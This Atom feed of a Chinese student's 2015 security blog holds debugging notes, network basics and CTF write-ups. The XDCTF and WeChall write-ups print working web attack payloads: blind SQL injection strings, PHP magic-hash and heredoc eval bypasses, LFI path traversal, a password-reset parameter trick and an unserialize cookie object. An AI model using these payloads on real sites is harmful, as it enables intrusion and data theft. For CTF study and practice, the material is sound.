<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Hc1m1]]></title>
  <subtitle><![CDATA[Blog]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://lazysheep.cc//"/>
  <updated>2015-10-31T13:41:04.522Z</updated>
  <id>http://lazysheep.cc//</id>
  
  <author>
    <name><![CDATA[Hcamael]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[10.31新生培训]]></title>
    <link href="http://lazysheep.cc/2015/10/31/0x0B/"/>
    <id>http://lazysheep.cc/2015/10/31/0x0B/</id>
    <published>2015-10-31T13:28:26.000Z</published>
    <updated>2015-10-31T13:41:04.522Z</updated>
    <content type="html"><![CDATA[<p>10.31新生培训<br><a id="more"></a></p>
<h2 id="代码的调试之旅_——_Debug">代码的调试之旅 —— Debug</h2><ol>
<li>VS2015<ul>
<li>F10 step out</li>
<li>F11 step into</li>
</ul>
</li>
<li>codeblocks<ul>
<li>shitf F7 step into</li>
<li>F7 step </li>
</ul>
</li>
<li>gdb<ul>
<li>next 执行下一行语句</li>
<li>step 同上，有函数则会进入函数</li>
<li>run 运行到断点处</li>
<li>breakpoint 下断点</li>
<li>start 停在main的第一行语句前</li>
<li>print 打印变量</li>
<li>display 跟踪一个变量</li>
<li>undisplay 取消跟踪</li>
<li>info locals 查看局部变量</li>
<li>list 列出最近十行代码</li>
</ul>
</li>
</ol>
<h2 id="BUG">BUG</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// error1.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span>&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">index</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>)；</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//error2.c</span></span><br><span class="line"><span class="preprocessor">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	<span class="keyword">char</span> b[<span class="number">2</span>] = <span class="string">'ab'</span>;</span><br><span class="line"></span><br><span class="line">	a = <span class="string">"c"</span>;</span><br><span class="line"></span><br><span class="line">	printf(<span class="string">"b = %s and a = %c\n"</span>, b, a);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//error_last.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> yue</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="keyword">struct</span> yue *next;</span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> yue *creat(<span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> yue *head, *pold, *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	p = head = pold;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i&lt;a; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p = (<span class="keyword">struct</span> yue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> yue));</span><br><span class="line">		p-&gt;num = i;</span><br><span class="line">		pold-&gt;next = p;</span><br><span class="line">		pold = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p-&gt;num = a;</span><br><span class="line">	p-&gt;next = head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">struct</span> yue *p1, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">	p = p1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">1</span>; n&lt; b - <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%5d"</span>, p-&gt;num);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node *p2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input x:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line"></span><br><span class="line">	p2 = creat(x);</span><br><span class="line">	print(p2, x);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="知识积淀_——_博客_OR_笔记">知识积淀 —— 博客 OR 笔记</h2><h3 id="For_yourself">For yourself</h3><pre><code>-<span class="ruby"> 作为知识的积淀，记录了你的成长
</span>-<span class="ruby"> 你确定你真的掌握了吗？如果你能把该知识点用文字描述出来，那么你就算是真的掌握了
</span>-<span class="ruby"> 备忘</span>
</code></pre><h3 id="For_others">For others</h3><pre><code>-<span class="ruby"> 知识分享
</span>-<span class="ruby"> 交友
</span>-<span class="ruby"> 面试时加分</span>
</code></pre><h3 id="How_can_I_write?">How can I write?</h3><pre><code>就想写日记一样， 多写，多看就知道怎么写了
</code></pre><h3 id="第三方博客">第三方博客</h3><pre><code>-<span class="ruby"> <span class="symbol">http:</span>/<span class="regexp">/www.diandian.com/</span>
</span>-<span class="ruby"> <span class="symbol">http:</span>/<span class="regexp">/blog.csdn.net/</span>
</span>-<span class="ruby"> 百度、新浪 等等</span>
</code></pre><p><em>PS: 可以从我博客的友情链接中发现协会其他人的博客</em></p>
<h2 id="推荐文章">推荐文章</h2><ol>
<li>前言: <a href="http://zhuanlan.zhihu.com/Evi1m0/19695848" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19695848</a></li>
<li>因为所以 <a href="http://zhuanlan.zhihu.com/Evi1m0/19700177" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19700177</a></li>
<li>黑客眼中的黑客 <a href="http://zhuanlan.zhihu.com/Evi1m0/19702939" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19702939</a></li>
<li>学会使用搜索引擎 <a href="http://zhuanlan.zhihu.com/Evi1m0/19714051" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19714051</a></li>
<li>首先，你需要先学会编程 <a href="http://zhuanlan.zhihu.com/Evi1m0/19733294" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19733294</a></li>
<li>你们眼中的黑客 —— 脚本小子 <a href="http://zhuanlan.zhihu.com/Evi1m0/19773598" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19773598</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>10.31新生培训<br>]]>
    
    </summary>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[网络基础学习之三]]></title>
    <link href="http://lazysheep.cc/2015/10/05/0x0A/"/>
    <id>http://lazysheep.cc/2015/10/05/0x0A/</id>
    <published>2015-10-05T13:30:11.000Z</published>
    <updated>2015-10-15T01:43:51.614Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/net.jpg" alt="network"><br><a id="more"></a><br>半年前, 我在博客里写下了 <a href="http://old.lazysheep.cc/2015/01/04/0x01/" target="_blank" rel="external">HOW TO STUDY NETWORK（一）</a> 和 <a href="http://old.lazysheep.cc/2015/01/04/0x02/" target="_blank" rel="external">HOW TO STUDY NETWORK (二)</a><br>如今回首看看, 有许多不足… 现在进行一些补充和总结, 所以有了之三..</p>
<p>在我看来, 网络是安全的基础, 如果没有网络, 只需要多顾些保安就行了, 还有我们干的事? 哦, 逆向还有活路..</p>
<p>跟以前不同, 现在我认为网络的学习可以分为三个方向,<br>第一，就是往网络工程师这个方向学习，关于这方面，我认为我的 <code>HOW TO STUDY NETWORK(一)</code> 里已经写的很清楚了，我觉得没啥需要补充的了。。对于这个方向需要达到的能力我觉得很简单，也很难 —&gt; 能按照要求搭建网络环境 &amp;&amp; 拥有故障排查能力。。<br>这个方向不是只要学CCNA就行的，考完CCNA之后就需要靠CCNP，就像标题说的一样，我写的只是基础入门的内容，而入门之后，你自己就会知道之后的道路了。。</p>
<p>第二，网络协议开发。。。主要是开发应用层的协议（其他层的当然也会有），学网络（socket）编程？由于这方面我接触的少，就先略过。。</p>
<p>第三，网络安全，有开发自然有安全，这应该是运维工程师学习的方向，这个方向上，网络作为必备的基础知识。有网络流量监控，审计之类。</p>
<p>上面大致介绍了一下我分的方向，下面讲讲各个协议层。</p>
<p>从低到高吧，第一层讲起。。</p>
<h2 id="物理层">物理层</h2><p>这层算是最简单的了，这层要防御啥？应该就是物理攻击了。还需要会做网线。。</p>
<h2 id="数据链路层">数据链路层</h2><p>这层貌似是最好玩的，有arp协议，和无线协议（802.11）</p>
<h3 id="ARP协议">ARP协议</h3><p>利用ARP的特性，可以进行ARP攻击，这个网络上教程很多，就不细说了。。<br>至于防御，就需要靠网络工程师来做，要对内网进行VLAN划分。(VLAN是啥？先看CCNA去)</p>
<h3 id="无线协议">无线协议</h3><p>主要是802.11之类的，最近发现，使用wireshark，把无线网卡设置为混杂模式，则可以对周围空间中的802.11数据包进行抓取。对于家用路由器，需要破获路由器密码才能查看数据包的明文，但是对于CMCC，ChinaNet之类免密码的无线数据，可以直接获取明文，这个ARP的区别在于，ARP可以进行中间人截获流量，然后进行更改，而无线流量只能查看，却不能更改。但相较于ARP，这种方式更隐蔽，更不容易让他人发觉。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/net.jpg" alt="network"><br>]]>
    
    </summary>
    
      <category term="网络" scheme="http://lazysheep.cc/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不使用select情况下的各种盲注]]></title>
    <link href="http://lazysheep.cc/2015/10/05/0x09/"/>
    <id>http://lazysheep.cc/2015/10/05/0x09/</id>
    <published>2015-10-05T03:17:10.000Z</published>
    <updated>2015-10-15T01:09:09.824Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br><a id="more"></a><br>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
<p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
<p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload 0x0:</span><br><span class="line">    $i = 1" &amp;&amp; username="%</span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> talbe <span class="keyword">where</span> ID=<span class="string">"1"</span> &amp;&amp; username=<span class="string">"%"</span></span><br><span class="line">这个payload可以用来猜测是否有该字段, 接下来的盲注这语句仍然可用</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x1</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR if(rpad(username,1,1)="</span>a<span class="string">",1,0)#  或者 111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">101</span>),<span class="number">1</span>,<span class="number">0</span>)# </span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">"a"</span>,<span class="number">1</span>,<span class="number">0</span>)#<span class="string">"</span><br><span class="line">在知道该表有username字段后, 可以通过这语句进行盲注</span></span></span><br></pre></td></tr></table></figure>
<p>上面的语句用到了两个函数, 一个 <code>if()</code> &amp;&amp; <code>rpad()</code><br>if函数在我之前的博客中写过, 就不再多说..主要讲讲rpad()<br>rpad还有个相同功能的行数lpad, 一个是right 一个是 left , 具体的用法已实例来讲解:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select name from table;</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| name     |</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| Hcamael  |</span><br><span class="line">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| rpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| Hcamael111          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| lpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| 111Hcamael          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>这两个函数有三个参数, 第一个是字段名, 第二个是显示几位, 第三个是当位数不足时, 以啥补充..</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload 0x2:</span><br><span class="line">    $i = 111" OR username REGEXP "^[a-z]</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID =<span class="string">"111"</span> <span class="keyword">OR</span> username <span class="keyword">REGEXP</span> <span class="string">"^[a-z]"</span></span><br><span class="line">正则匹配法注入, 真是涨姿势了, 第一次见</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x3</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR (ascii(ord(username,1,1)))=97# 或者 111"</span> <span class="keyword">OR</span> (<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>))=<span class="string">'a'</span>#</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> (<span class="keyword">ascii</span>(<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">97</span>#<span class="string">"</span><br><span class="line">这种方法我以前盲注的时候写过, 可是当没有select的时候, 我却自然的以为这些不行用了...</span></span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br>]]>
    
    </summary>
    
      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[2015XDCTF低分web题writeup]]></title>
    <link href="http://lazysheep.cc/2015/10/03/0x08/"/>
    <id>http://lazysheep.cc/2015/10/03/0x08/</id>
    <published>2015-10-03T06:11:30.000Z</published>
    <updated>2015-10-15T01:09:05.489Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br><a id="more"></a><br>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
<h2 id="web1_100">web1 100</h2><p><code>index.php~</code> 搞出源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;xxxxxx&#125;"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"you are falied!"</span>; </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"</span>; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题黑魔法啊!!! 真是学习了<br><code>md5(&#39;240610708&#39;) = 0e462097431906509019562988736854</code><br>而 <code>&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;</code></p>
<h2 id="web1_200">web1 200</h2><p>这题是大JAVA的题目,  可惜并不会,, 就是有个一个SessionExample界面, 可以进行设置session, (为啥需要这种东西?)<br>然后设置, login=true, user=Administrator</p>
<h2 id="web2_系列-">web2 系列..</h2><p>P神出的代码审计4连套, PS: P神写的站, 给你代码你也日不动~~<br>只搞定两题..</p>
<h3 id="web2_200">web2 200</h3><p>第一步是搞到源码, 题目里说了用git管理源码, 所以应该是.git 泄露了… 访问 /.git 403, 果然是….</p>
<p>去百度后下载了 <code>rip-git.pl</code> ,拖/.git, 拖下来了, 却不能还原源码, 估计有些重要的没拖下来..</p>
<p>接下来是:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout master</span><br><span class="line"><span class="variable">$ </span>git checkout -f</span><br></pre></td></tr></table></figure></p>
<p>搞出来了个 <code>README.md</code><br>根据里面的提示, 去网站上搞到了个 /.git/refs/tags/1.0<br>然后把 /.git/refs/heads/master 的hash 值用 /tags/1.0 里的hash替换<br>再 <code>$ git checkout -f</code><br>然后就搞到源码了, 第一个200的flag就在index.php里..</p>
<h3 id="web2_100">web2 100</h3><p>存在强制修改任意用户密码漏洞, 管理员邮箱在首页: xdsec-cms@xdctf.com<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"><span class="link_url">http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-cms@xdctf.com&amp;verify</span>[<span class="link_label">1</span>]=aa</span><br></pre></td></tr></table></figure></p>
<p>修改密码后登录, get 100 flag…</p>
<p>后面就日不动了,,, 毕竟P神…<br>XDCTF的web题质量都挺高的…学到了很多..</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WeChall Writeup]]></title>
    <link href="http://lazysheep.cc/2015/08/07/0x06/"/>
    <id>http://lazysheep.cc/2015/08/07/0x06/</id>
    <published>2015-08-07T09:01:53.000Z</published>
    <updated>2015-10-15T01:08:56.793Z</updated>
    <content type="html"><![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br><a id="more"></a></p>
<p>年轻人, 要多撸题, 少打炮..</p>
<h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
<h2 id="0x01_Training:_PHP_LFI">0x01 Training: PHP LFI</h2><p>看源码, 文件包含漏洞.<br>payload: <code>index.php?file=../../solution.php%00</code></p>
<h2 id="0x02_PHP_0817">0x02 PHP 0817</h2><p>这个比较傻..不多说.<br>payload: <code>index.php?which=solution</code></p>
<h2 id="0x03_Training:_Register_Globals">0x03 Training: Register Globals</h2><p>全局变量的问题,,上次看到过,,不过现在的php已经没这漏洞了…(PHP还是那么老版本的活该..)<br>payload: <code>globals.php?login[]=admin</code></p>
<h2 id="0x04_Are_you_serial">0x04 Are you serial</h2><p>这个有点屌…放代码吧..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoloader</span><span class="params">(<span class="variable">$classname</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./'</span>.str_replace(<span class="string">'.'</span>, <span class="string">''</span>, <span class="variable">$classname</span>).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cece</span><span class="params">(<span class="variable">$name</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">'cece'</span>);</span><br><span class="line"> <span class="comment">#spl_autoload_register('my_autoloader');</span></span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="string">'O:7:"phpinfo":0:&#123;&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
<p>这题的重点就在于 <code>spl_autoload_register</code> 这个函数.<br>解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到 (<code>sql_autoload_register(xxx)</code>) xxx函数中.<br>这题只要能运行 <code>SERIAL_Solution.php</code> 这个文件就算成功</p>
<p>所以最后的payload是改cookie,<br><code>serial_user</code> 的值为 <code>O:15:&quot;SERIAL_Solution&quot;:0:{}</code></p>
<h2 id="0x05_PHP_0819">0x05 PHP 0819</h2><p>第一次知道php还有这鬼东西….heredoc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;suibian</span><br><span class="line">正文</span><br><span class="line">正文</span><br><span class="line">suibian;</span></span><br><span class="line"><span class="comment">// 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;</span></span><br></pre></td></tr></table></figure>
<p>这题的目的 <code>eval(&quot;\$spaceone=&#39;1337&#39;;&quot;);</code><br>但是引号都被过滤了…所以就可以用上面的那个代替引号…这里由于<code>eval</code>的原因, 结尾还要再来一个换行<br>payload: <code>index.php?eval=&lt;&lt;&lt;r%0a1337%0ar;%0a</code></p>
<h2 id="0x06_HOST_me">0x06 HOST me</h2><p>这题一看就知道是去改host, 不过比较坑….改成 <code>host:localhost</code> 后会报错…纠结了好久..<br>网上查了以下才知道…需要….<br>payload:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只把要修改的行列出来</span></span><br><span class="line">GET <span class="string">http:</span><span class="comment">//www.wechall.net/challenge/space/host_me/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost</span><br></pre></td></tr></table></figure></p>
<h2 id="0x07_PHP_0815">0x07 PHP 0815</h2><p>这题有点屌…这题的大概意思是它给你的代码存在sqli, 然后让你给出修补的方案, 要给出最短, 还不会影响原程序的方案…<br>表示并不会, 只看出了应该是修改 <code>in_array</code> 这里..<br>到网上搜索后才知道, 需要把 <code>$show</code> 转换为int 型, 有 <code>int()</code> 和 <code>intval()</code> 然而答案要最短,<br>最短的黑魔法…. —&gt; <code>$show - 0</code><br>提交 <code>in_array($show-0, $whitelist)</code> 竟然不对…坑爹的…最后提交 <code>-0</code> 过了..</p>
